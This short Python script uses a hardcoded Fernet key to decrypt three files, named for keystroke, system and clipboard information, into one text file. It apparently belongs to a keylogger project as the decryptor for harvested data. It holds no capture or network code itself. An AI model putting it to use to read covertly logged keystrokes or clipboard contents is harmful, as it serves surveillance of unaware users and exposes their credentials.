from cryptography.fernet import Fernet

key = "cdT0ZnN7FdUS-WfDmzIvyN9zugMcYOcEyICSd3h8jsE="

key_information = "I_Key.txt"
key_system_information = "S_Key.txt"
key_clipboard_information = "C_Key.txt"

encrypted_files = [key_information, key_system_information, key_clipboard_information]
count = 0


for decrypting_files in encrypted_files:

    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open("Encryptor & Decryptor\\Decryption.txt", 'ab') as f:
        f.write(decrypted)

    count += 1